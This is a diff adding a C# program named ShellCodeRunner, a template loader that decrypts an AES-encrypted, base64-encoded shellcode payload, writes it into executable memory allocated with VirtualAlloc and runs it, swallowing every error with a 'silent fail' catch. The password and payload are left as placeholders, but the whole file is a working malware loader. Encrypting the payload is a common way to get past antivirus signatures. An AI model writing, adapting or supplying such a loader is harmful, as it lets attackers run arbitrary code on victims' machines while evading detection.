@@ -1,0 +1,144 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Security.Cryptography;
+using System.Runtime.InteropServices;
+using System.IO;
+using System.Security;
+
+namespace ShellCodeRunner
+{
+    public class ShellCodeRunner
+    {
+        public delegate int FunctionPointer(int v);
+
+        [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true)]
+        static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, AllocationType flAllocationType, MemoryProtection flProtect);
+
+        [System.Runtime.InteropServices.DllImport("kernel32")]
+        private static extern bool VirtualFree(IntPtr lpAddress, UInt32 dwSize, UInt32 dwFreeType);
+
+        public static void Main(string[] args)
+        {
+            try
+            {
+                var password = "<<<<PASSWORDHERE>>>>";
+
+                var encryptedShellCode = "<<<<SHELLCODEHERE>>>>";
+
+                //Unpack the shellcode into a byte array
+                var shellCode = Convert.FromBase64String(DecryptStringAES(encryptedShellCode, password));
+
+                //Run the shellcode
+                RunShellCode(1, shellCode);
+            }
+            catch 
+            {
+                //silent fail
+            }
+        }
+
+        static public int RunShellCode(int someInteger, byte[] shellcode)
+        {
+            //Allocate memory
+            var p = VirtualAlloc(IntPtr.Zero, new UIntPtr((uint)shellcode.Length), AllocationType.COMMIT | AllocationType.RESERVE, MemoryProtection.EXECUTE_READWRITE);
+
+            //Copy the shellcode into memory
+            System.Runtime.InteropServices.Marshal.Copy(shellcode, 0, p, shellcode.Length);
+
+            //Run it
+            var function = (FunctionPointer)System.Runtime.InteropServices.Marshal.GetDelegateForFunctionPointer(p, typeof(FunctionPointer));
+            try
+            {
+                someInteger = function(someInteger);
+            }
+            catch { }
+            finally
+            {
+                //Never call alloc without calling free!
+                VirtualFree(p, 0, 0x8000);
+            }
+
+            return someInteger;
+        }
+
+        //TODO: Random salt value
+        private static byte[] _salt = Encoding.ASCII.GetBytes("o6806642kbM7c5");
+
+        public static string DecryptStringAES(string cipherText, string sharedSecret)
+        {
+            if (string.IsNullOrEmpty(cipherText))
+                throw new ArgumentNullException("cipherText");
+            if (string.IsNullOrEmpty(sharedSecret))
+                throw new ArgumentNullException("sharedSecret");
+
+            RijndaelManaged aesAlg = null;
+
+            string plaintext = null;
+
+            try
+            {
+                var key = new Rfc2898DeriveBytes(sharedSecret, _salt);
+
+                var bytes = Convert.FromBase64String(cipherText);
+                using (MemoryStream msDecrypt = new MemoryStream(bytes))
+                {
+                    aesAlg = new RijndaelManaged();
+                    aesAlg.Key = key.GetBytes(aesAlg.KeySize / 8);
+
+                    aesAlg.IV = ReadByteArray(msDecrypt);
+
+                    ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);
+                    using (var csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
+                    {
+                        using (var srDecrypt = new StreamReader(csDecrypt))
+                            plaintext = srDecrypt.ReadToEnd();
+                    }
+                }
+            }
+            finally
+            {
+                if (aesAlg != null)
+                    aesAlg.Clear();
+            }
+
+            return plaintext;
+        }
+        private static byte[] ReadByteArray(Stream s)
+        {
+            var rawLength = new byte[sizeof(int)];
+            if (s.Read(rawLength, 0, rawLength.Length) != rawLength.Length)
+            {
+                throw new SystemException("Stream did not contain properly formatted byte array");
+            }
+
+            var buffer = new byte[BitConverter.ToInt32(rawLength, 0)];
+            if (s.Read(buffer, 0, buffer.Length) != buffer.Length)
+            {
+                throw new SystemException("Did not read byte array properly");
+            }
+
+            return buffer;
+        }
+
+        #region magic numbers for windows
+
+        public enum AllocationType : uint
+        {
+            COMMIT = 0x1000, RESERVE = 0x2000, RESET = 0x80000, LARGE_PAGES = 0x20000000,
+            PHYSICAL = 0x400000, TOP_DOWN = 0x100000, WRITE_WATCH = 0x200000
+        }
+
+        public enum MemoryProtection : uint
+        {
+            EXECUTE = 0x10, EXECUTE_READ = 0x20, EXECUTE_READWRITE = 0x40,
+            EXECUTE_WRITECOPY = 0x80, NOACCESS = 0x01, READONLY = 0x02, READWRITE = 0x04,
+            WRITECOPY = 0x08, GUARD_Modifierflag = 0x100, NOCACHE_Modifierflag = 0x200,
+            WRITECOMBINE_Modifierflag = 0x400
+        }
+        #endregion
+    }
+
+}
